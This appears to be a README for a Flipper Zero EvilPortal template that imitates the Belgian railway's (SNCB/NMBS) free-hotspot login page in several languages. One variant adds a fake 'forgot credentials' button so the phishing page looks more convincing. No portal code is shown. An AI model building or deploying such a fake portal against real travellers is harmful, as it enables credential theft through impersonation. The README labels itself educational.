# !!FOR EDUCATIONAL USES ONLY!!
This one **emulates a portal for a Belgian-Rail "Free Hotspot"** using EvilPortal on your Flipper Zero.
SNCB (in French), NMBS (in Dutch) or B-rail (in both) is the Belgian railway company. Yes, one company, 3 names. Welcome to Belgium.

# I also included a French and Dutch version of the portal


The **HTML in the *"WithForgotCredentials"* file** contains a **"forgot credentials" button on the user side to make it look more realistic**. This button only shows a message inviting them to go on their provider's app if they forgot their login/password.
## Happy flippin'

